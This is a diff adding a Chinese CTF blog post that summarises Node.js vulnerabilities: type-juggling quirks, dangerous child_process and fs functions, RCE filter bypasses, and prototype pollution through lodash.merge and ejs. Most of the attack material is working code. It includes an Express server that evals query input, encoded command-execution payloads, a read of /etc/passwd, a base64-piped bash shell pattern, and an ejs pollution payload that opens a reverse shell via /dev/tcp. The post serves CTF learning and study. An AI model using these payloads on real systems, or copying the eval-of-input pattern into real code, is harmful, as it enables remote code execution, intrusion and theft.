@@ -1,0 +1,1188 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>Nodejs漏洞总结 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">Nodejs漏洞总结</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">2022-11-20</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/">常见漏洞和手法</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h1 id="Nodejs语言特性"><a href="#Nodejs语言特性" class="headerlink" title="Nodejs语言特性"></a>Nodejs语言特性</h1><h2 id="大小写特性"><a href="#大小写特性" class="headerlink" title="大小写特性"></a>大小写特性</h2><pre><code class="plsql">toUpperCase()
+toLowerCase()
+</code></pre>
+<p> 对于toUpperCase(): 字符”ı”、”ſ” 经过toUpperCase处理后结果为 “I”、”S”<br>对于toLowerCase(): 字符”K”经过toLowerCase处理后结果为”k”(这个K不是K)  </p>
+<h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><h3 id="大小比较"><a href="#大小比较" class="headerlink" title="大小比较"></a>大小比较</h3><pre><code class="plsql">console.log(1==&#39;1&#39;); //true 
+console.log(1&gt;&#39;2&#39;); //false 
+console.log(&#39;1&#39;&lt;&#39;2&#39;); //true 
+console.log(111&gt;&#39;3&#39;); //true 
+console.log(&#39;111&#39;&gt;&#39;3&#39;); //false 
+console.log(&#39;asd&#39;&gt;1); //false
+</code></pre>
+<p> 总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false  </p>
+<h3 id="数组比较"><a href="#数组比较" class="headerlink" title="数组比较"></a>数组比较</h3><pre><code class="plsql">console.log([]==[]); //false 
+console.log([]&gt;[]); //false
+console.log([6,2]&gt;[5]); //true 
+console.log([100,2]&lt;&#39;test&#39;); //true 
+console.log([1,2]&lt;&#39;2&#39;);  //true 
+console.log([11,16]&lt;&quot;10&quot;); //false
+</code></pre>
+<p> 总结：空数组之间比较永远为false，数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，数组永远小于非数值型字符串；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较  </p>
+<h3 id="还有一些比较特别的相等："><a href="#还有一些比较特别的相等：" class="headerlink" title="还有一些比较特别的相等："></a>还有一些比较特别的相等：</h3><pre><code class="plsql">console.log(null==undefined) // 输出：true 
+console.log(null===undefined) // 输出：false 
+console.log(NaN==NaN)  // 输出：false 
+console.log(NaN===NaN)  // 输出：false
+</code></pre>
+<h2 id="变量拼接："><a href="#变量拼接：" class="headerlink" title="变量拼接："></a>变量拼接：</h2><pre><code class="plsql">console.log(5+[6,6]); //56,6
+console.log(&quot;5&quot;+6); //56 
+console.log(&quot;5&quot;+[6,6]); //56,6 
+console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6
+</code></pre>
+<h2 id="MD5的绕过"><a href="#MD5的绕过" class="headerlink" title="MD5的绕过"></a>MD5的绕过</h2><pre><code class="plsql">a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)
+</code></pre>
+<p>a[x]=1&amp;b[x]=2<br>数组会被解析成**[object Object]      **</p>
+<pre><code class="plsql">a=&#123;&#39;x&#39;:&#39;1&#39;&#125;
+b=&#123;&#39;x&#39;:&#39;2&#39;&#125;
+ 
+console.log(a+&quot;flag&#123;xxx&#125;&quot;)
+console.log(b+&quot;flag&#123;xxx&#125;&quot;)
+ 
+a=[1]
+b=[2]
+ 
+console.log(a+&quot;flag&#123;xxx&#125;&quot;)
+console.log(b+&quot;flag&#123;xxx&#125;&quot;)
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1667810117885-97fe09ad-6c49-4819-8356-cf5c04b9446c.png" alt="2f6f612f38094b2ab52b16106b4cdaff.png"></p>
+<h2 id="ES6模板字符串"><a href="#ES6模板字符串" class="headerlink" title="ES6模板字符串"></a>ES6模板字符串</h2><p>我们可以使用反引号替代括号执行函数，可以用反引号替代单引号双引号，可以在反引号内插入变量。<br>但是有一点我们需要注意，模板字符串是将字符串作为参数传入函数中，而参数是一个数组，所以数组遇到${}时，字符串会被分割。</p>
+<pre><code class="plsql">var yake = &quot;sakura&quot;;
+console.log(&quot;hello %s&quot;,yake);
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783362313-8f198fb4-93cd-4572-8a3e-a256390cb13e.png" alt="image.png"></p>
+<pre><code class="plsql">var yake = &quot;sakura&quot;;
+console.log`hello$&#123;yake&#125;world`;
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783434923-1fa642fb-e307-494e-8fbb-625f8f325521.png" alt="image.png"></p>
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="16进制编码"><a href="#16进制编码" class="headerlink" title="16进制编码"></a>16进制编码</h3><pre><code class="plsql">console.log(&quot;a&quot;===&quot;\x61&quot;); // true
+</code></pre>
+<h3 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h3><pre><code class="plsql">console.log(&quot;\u0061&quot;===&quot;a&quot;); // true
+</code></pre>
+<h3 id="base编码"><a href="#base编码" class="headerlink" title="base编码"></a>base编码</h3><pre><code class="plsql">eval(Buffer.from(&#39;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#39;,&#39;base64&#39;).toString())
+</code></pre>
+<h1 id="Nodejs危险函数的利用"><a href="#Nodejs危险函数的利用" class="headerlink" title="Nodejs危险函数的利用"></a>Nodejs危险函数的利用</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p> javascript 的 eval 作用就是计算某个字符串，并执行其中的 js 代码。  </p>
+<pre><code class="plsql">console.log(eval(&quot;document.cookie&quot;)); //执行document.cookie
+console.log(&quot;document.cookie&quot;); //输出document.cookie
+</code></pre>
+<p><strong>我们来搭建一个服务测试一下</strong></p>
+<pre><code class="plsql">var express = require(&quot;express&quot;);
+var app = express();
+
+app.get(&#39;/&#39;,function(req,res)&#123;
+    res.send(eval(req.query.a));
+console.log(req.query.a);
+&#125;)
+
+app.listen(1234);
+console.log(&#39;Server runing at http://127.0.0.1:1234/&#39;);
+</code></pre>
+<p> Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令<br><strong>1.exec()</strong><br> 启动一个子进程来执行命令，与spawn()不同的是其接口不同，它有一个回调函数获知子进程的状况。实际使用可以不加回调函数。  </p>
+<pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;calc&#39;);
+</code></pre>
+<pre><code class="plsql">http://127.0.0.1:1234/?a=require(&#39;child_process&#39;).exec(&#39;ping 8ogywq.dnslog.cn&#39;);
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784913491-37d4aa9c-2ac5-4002-907b-85b127ba50f2.png" alt="image.png"><br>我们可以看到成功执行了命令<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784938711-2a5fe36d-fc0c-4e43-8237-6446a8cc5fa9.png" alt="image.png"><br><strong>我们可以进行反弹shell的操作:</strong></p>
+<pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;echo SHELL_BASE_64|base64 -d|bash&#39;);
+
+注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)
+</code></pre>
+<p>PS：如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，<br>则可以使用global.process.mainModule.constructor._load(‘child_process’).exec(‘calc’)来执行命令</p>
+<p><strong>2.spawn()</strong><br> 启动一个子进程来执行命令。spawn (命令，{shell:true})。需要开启命令执行的指令。  </p>
+<pre><code class="plsql">require(&#39;child_process&#39;).spawn(&#39;whoami&#39;,&#123;shell:true&#125;);
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668785909690-1fbe2c21-44f1-46e5-b078-762a11e53787.png" alt="image.png"><br><strong>3.fork()</strong><br> 与spawn()类似，不同点在于它创建Node的子进程只需指定要执行的JavaScript文件模块即可。用于执行 js 文件，实际利用中需要提前写入恶意文件  </p>
+<pre><code class="plsql">require(&#39;child_process&#39;).fork(&#39;C:\\Users\\Sakura\\Desktop\\evil.js&#39;);
+</code></pre>
+<p>此时是假设我们已经上传了evil.js文化,我们就可以用fork去执行<br>如我们在evil.js中代码如下:</p>
+<pre><code class="plsql">console.log(&quot;hello hacker&quot;);
+</code></pre>
+<p>我们此时访问这个网站</p>
+<pre><code class="plsql">http://127.0.0.1:1234/?a=require(%27child_process%27).fork(%27C:\\Users\\Sakura\\Desktop\\evil.js%27);
+</code></pre>
+<p>如图，命令被成功执行了<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668788483287-4013c99b-b180-45fe-99cc-a06226ef1751.png" alt="image.png"><br><strong>4.execFile()</strong><br> 启动一个子进程来执行可执行文件。实际利用时，在第一个参数位置执行 shell 命令，类似 exec。  </p>
+<pre><code class="plsql">require(&#39;child_process&#39;).execFile(&quot;calc&quot;,&#123;shell:true&#125;);
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668789182418-b79fe64a-ed03-4594-abe0-0ad2e03fa454.png" alt="image.png"><br><strong>注意点:</strong></p>
+<ol>
+<li>**<em>spawn()与exec()、execFile()不同的是，后两者创建时可以指定timeout属性</em>**，设置超时时间， 一旦创建的进程运行超过设定的时间将会被杀死。</li>
+<li>exec()与execFile()不同的是，**<em>exec()适合执行已有的命令，execFile()适合执行文件</em>**。</li>
+</ol>
+<p><strong>后面几个函数的利用方法也是调用上述介绍的四种方法,这里就不再赘述!</strong></p>
+<h3 id="settimeout"><a href="#settimeout" class="headerlink" title="settimeout()"></a>settimeout()</h3><p> settimeout(function,time)，该函数作用是两秒后执行函数，function 处为我们可控的参数。  </p>
+<pre><code class="plsql">var express = require(&quot;express&quot;);
+var app = express();
+
+setTimeout(()=&gt;&#123;
+  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);
+&#125;,2000);
+
+var server = app.listen(1234,function()&#123;
+    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;);
+&#125;)
+</code></pre>
+<h3 id="setinterval"><a href="#setinterval" class="headerlink" title="setinterval()"></a>setinterval()</h3><p> setinterval (function,time)，该函数的作用是每个两秒执行一次代码。  </p>
+<pre><code class="plsql">var express = require(&quot;express&quot;);
+var app = express();
+
+setInterval(()=&gt;&#123;
+  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);
+&#125;,2000);
+
+
+var server = app.listen(1234,function()&#123;
+    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;);
+&#125;)
+</code></pre>
+<h3 id="function"><a href="#function" class="headerlink" title="function()"></a>function()</h3><p> function(string)()，string 是传入的参数，这里的 function 用法类似于 php 里的 create_function。  </p>
+<pre><code class="plsql">var express = require(&quot;express&quot;);
+var app = express();
+
+var aaa=Function(&quot;console.log(&#39;Hacked&#39;)&quot;)();
+
+var server = app.listen(1234,function()&#123;
+    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;);
+&#125;)
+</code></pre>
+<h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>既然我们可以执行函数，那自然可以进行文件的增删改查。<br>操作函数后面有Sync代表同步方法</p>
+<blockquote>
+<p>Node.js 文件系统（fs 模块）模块中的方法均有异步和同步版本，例如读取文件内容的函数有异步的 fs.readFile() 和同步的 fs.readFileSync()。<br>异步的方法函数最后一个参数为回调函数，回调函数的第一个参数包含了错误信息(error)。<br>建议大家使用异步方法，比起同步，异步方法性能更高，速度更快，而且没有阻塞。</p>
+</blockquote>
+<p><strong>读</strong><br>readFile()</p>
+<pre><code class="plsql">require(&#39;fs&#39;).readFile(&#39;/etc/passwd&#39;, &#39;utf-8&#39;, (err, data) =&gt; &#123;
+ if (err) throw err;
+ console.log(data);
+&#125;);
+</code></pre>
+<p> readFileSync()</p>
+<pre><code class="plsql">require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;,&#39;utf-8&#39;)
+</code></pre>
+<p>readdirSync</p>
+<pre><code class="plsql">require(&#39;fs&#39;).readdirSync(&#39;.&#39;).toString()
+</code></pre>
+<p>rmdirSync</p>
+<pre><code class="plsql">require(&#39;fs&#39;).rmdirSync(&#39;./daigua&#39;).toString()
+</code></pre>
+<p><strong>写</strong><br> writeFileSync()</p>
+<pre><code class="plsql">require(&#39;fs&#39;).writeFileSync(&#39;input.txt&#39;,&#39;sss&#39;);
+</code></pre>
+<p> writeFile()</p>
+<pre><code class="plsql">require(&#39;fs&#39;).writeFile(&#39;input.txt&#39;,&#39;test&#39;,(err)=&gt;&#123;&#125;)
+</code></pre>
+<h2 id="nodejs危险函数-RCE-bypass"><a href="#nodejs危险函数-RCE-bypass" class="headerlink" title="nodejs危险函数-RCE bypass"></a>nodejs危险函数-RCE bypass</h2><p> 原型:</p>
+<pre><code class="plsql">require(&quot;child_process&quot;).execSync(&#39;cat flag.txt&#39;)
+</code></pre>
+<h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat flag.txt&#39;)
+//(%2b就是+的url编码)
+ 
+require(&#39;child_process&#39;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;open /System/Applications/Calculator.app/&quot;)
+</code></pre>
+<h3 id="编码绕过-1"><a href="#编码绕过-1" class="headerlink" title="编码绕过"></a>编码绕过</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;](&#39;cat flag.txt&#39;)
+require(&quot;child_process&quot;)[&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;](&#39;cat fl001g.txt&#39;)
+eval(Buffer.from(&#39;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==&#39;,&#39;base64&#39;).toString()) //弹计算器
+</code></pre>
+<h3 id="模板拼接"><a href="#模板拼接" class="headerlink" title="模板拼接"></a>模板拼接</h3><pre><code class="plsql">require(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#39;open /System/Applications/Calculator.app/&#39;）
+</code></pre>
+<h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h3><pre><code class="plsql">require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;); 
+require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;); 
+require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); *//调用某个可执行文件，在第二个参数传args* 
+require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]); 
+require(&quot;child_process&quot;).spawnSync(&#39;sleep&#39;, [&#39;3&#39;]); 
+require(&quot;child_process&quot;).execFileSync(&#39;sleep&#39;, [&#39;3&#39;]);
+</code></pre>
+<h1 id="nodejs-原型链污染"><a href="#nodejs-原型链污染" class="headerlink" title="nodejs-原型链污染"></a>nodejs-原型链污染</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们首先要知道这几点:<br> 1.在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。  </p>
+<pre><code class="plsql">object.prototype.name=value
+</code></pre>
+<p> 2.在javascript，每一个实例对象都有一个__proto__属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：  </p>
+<pre><code class="html">objectname[&quot;__proto__&quot;]
+objectname.__proto__
+objectname.constructor.prototype
+</code></pre>
+<p> 3.不同对象所生成的原型链如下(部分)：  </p>
+<pre><code class="html">var o = &#123;a: 1&#125;;
+// o对象直接继承了Object.prototype
+// 原型链：
+// o ---&gt; Object.prototype ---&gt; null
+
+var a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];
+// 数组都继承于 Array.prototype
+// 原型链：
+// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null
+
+function f()&#123;
+return 2;
+&#125;
+// 函数都继承于 Function.prototype
+// 原型链：
+// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null
+</code></pre>
+<p>知道了以上三点以后，我们来介绍如何进行原型链污染</p>
+<p> 对于语句：object[a][b] = value 如果可以控制a、b、value的值，将a设置为__proto__，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。<br> 来看一个简单的例子:  </p>
+<pre><code class="html">object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;
+object1.__proto__.foo = &quot;Hello World&quot;;
+console.log(object1.foo);
+object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;
+console.log(object2.foo);
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668790669590-6b7771d7-3023-46f0-bb45-2ddec0c9e219.png" alt="image.png"><br>最终输出了两个hello word<br>为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了 一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p>
+<h2 id="merge操作导致原型链污染"><a href="#merge操作导致原型链污染" class="headerlink" title="merge操作导致原型链污染"></a>merge操作导致原型链污染</h2><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击。<br>例子:</p>
+<pre><code class="javascript">function merge(target, source) &#123;
+for (let key in source) &#123;
+    if (key in source &amp;&amp; key in target) &#123;
+        merge(target[key], source[key])
+    &#125; else &#123;
+        target[key] = source[key]
+        &#125;
+    &#125;
+&#125;
+
+let object1 = &#123;&#125;
+let object2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)
+merge(object1, object2)
+console.log(object1.a, object1.b)
+
+object3 = &#123;&#125;
+console.log(object3.b)
+
+# merge() 函数用于合并两个数组内容到第一个数组。在本段代码的作用就是将待操作的对象merge到一个空对象中
+</code></pre>
+<p>需要注意的点是：<br>在JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。<br>我们来看下，有和没有JSON解析的区别</p>
+<pre><code class="javascript">&lt;script&gt;
+          let o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;
+        console.log(o2)
+      let object2=JSON.parse(&#39;&#123;&quot;a&quot;:1,&quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#39;)
+      console.log(object2)
+  &lt;/script&gt;
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668836886258-58f08cf3-4739-40b1-ade0-6f1a54f8dc7f.png" alt="image-20220416001143881.png"><br> 所以代码在执行过程中会存在这么一步  </p>
+<pre><code class="javascript">target[__proto__]=source[__proto__]
+可理解为  object.prototype = &#123;&quot;b&quot;: 2&#125; 导致了原型链污染
+</code></pre>
+<p> 最终输出的结果为：<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668839912381-24bdf37b-f5df-41ea-a963-e5c31549da5d.png" alt="image.png"><br> 可见object3的b是从原型中获取到的，说明Object已经被污染了。  </p>
+<h2 id="lodash"><a href="#lodash" class="headerlink" title="lodash"></a>lodash</h2><blockquote>
+<p> lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：  </p>
+<ol>
+<li>lodash.template 一个简单的模板引擎</li>
+<li>lodash.merge 函数或对象的合并</li>
+</ol>
+<p> 其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p>
+</blockquote>
+<p>以<a target="_blank" rel="noopener" href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">Code-Breaking 2018 Thejs</a>为例说明分析过程:<br> 题目源码下载：<a target="_blank" rel="noopener" href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p>
+<pre><code class="javascript">const fs = require(&#39;fs&#39;)
+const express = require(&#39;express&#39;)
+const bodyParser = require(&#39;body-parser&#39;)
+const lodash = require(&#39;lodash&#39;)
+const session = require(&#39;express-session&#39;)
+const randomize = require(&#39;randomatic&#39;)
+
+const app = express()
+app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())
+app.use(&#39;/static&#39;, express.static(&#39;static&#39;))
+app.use(session(&#123;
+    name: &#39;thejs.session&#39;,
+    secret: randomize(&#39;aA0&#39;, 16),
+    resave: false,
+    saveUninitialized: false
+&#125;))
+app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine
+    fs.readFile(filePath, (err, content) =&gt; &#123;
+        if (err) return callback(new Error(err))
+        let compiled = lodash.template(content)
+        let rendered = compiled(&#123;...options&#125;)
+
+        return callback(null, rendered)
+    &#125;)
+&#125;)
+app.set(&#39;views&#39;, &#39;./views&#39;)
+app.set(&#39;view engine&#39;, &#39;ejs&#39;)
+
+app.all(&#39;/&#39;, (req, res) =&gt; &#123;
+    let data = req.session.data || &#123;language: [], category: []&#125;
+    if (req.method == &#39;POST&#39;) &#123;
+        data = lodash.merge(data, req.body)
+        req.session.data = data
+    &#125;
+    
+    res.render(&#39;index&#39;, &#123;
+        language: data.language, 
+        category: data.category
+    &#125;)
+&#125;)
+
+app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))
+</code></pre>
+<p> 问题出在lodash.merge()函数,这个函数存在原型链污染漏洞。我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840471628-b5711487-8536-4a31-b5b4-c779de7628db.png" alt="image-20220416004841823.png"><br> 页面最终会通过lodash.template进行渲染<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840499521-d6d64285-7a69-4e69-b6fb-a8221e5ff74f.png" alt="image-20220416005502144.png"><br> 跟踪到lodash/template.js中<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840571097-a32cb4ca-8bf1-44a2-b1ff-940d5d715282.png" alt="QyN5JVOde3YL8aZ.png"><br>如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。<br>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840627165-a79efcc5-3819-4e3f-8a7d-a2accd1ef055.png" alt="pwoVFrOyfzJX42M.png"><br>通过构造chile_process.exec()就可以执行任意代码了。<br>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</p>
+<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)//&quot;&#125;&#125;
+</code></pre>
+<p>(这里直接用require会报错：ReferenceError: require is not defined<br>p神给了一个更好的payload：</p>
+<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;
+</code></pre>
+<h2 id="ejs"><a href="#ejs" class="headerlink" title="ejs"></a>ejs</h2><blockquote>
+<p>主要为两个函数的伪造。<br>opts.outputFunctionName<br>opts.escapeFunction</p>
+</blockquote>
+<p><strong>例一</strong><br> test.js  </p>
+<pre><code class="javascript">var express = require(&#39;express&#39;);
+var _= require(&#39;lodash&#39;);
+var ejs = require(&#39;ejs&#39;);
+
+var app = express();
+//设置模板的位置
+app.set(&#39;views&#39;, __dirname);
+
+//对原型进行污染
+var malicious_payload = &#39;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;&#39;;
+_.merge(&#123;&#125;, JSON.parse(malicious_payload));
+
+//进行渲染
+app.get(&#39;/&#39;, function (req, res) &#123;
+    res.render (&quot;./test.ejs&quot;,&#123;
+        message: &#39;lufei test &#39;
+    &#125;);
+&#125;);
+
+//设置http
+var server = app.listen(8081, function () &#123;
+
+    var host = server.address().address
+    var port = server.address().port
+
+    console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)
+&#125;);
+</code></pre>
+<p> test.ejs  </p>
+<pre><code class="javascript">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;h1&gt;&lt;%= message%&gt;&lt;/h1&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p> payload：  </p>
+<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;
+</code></pre>
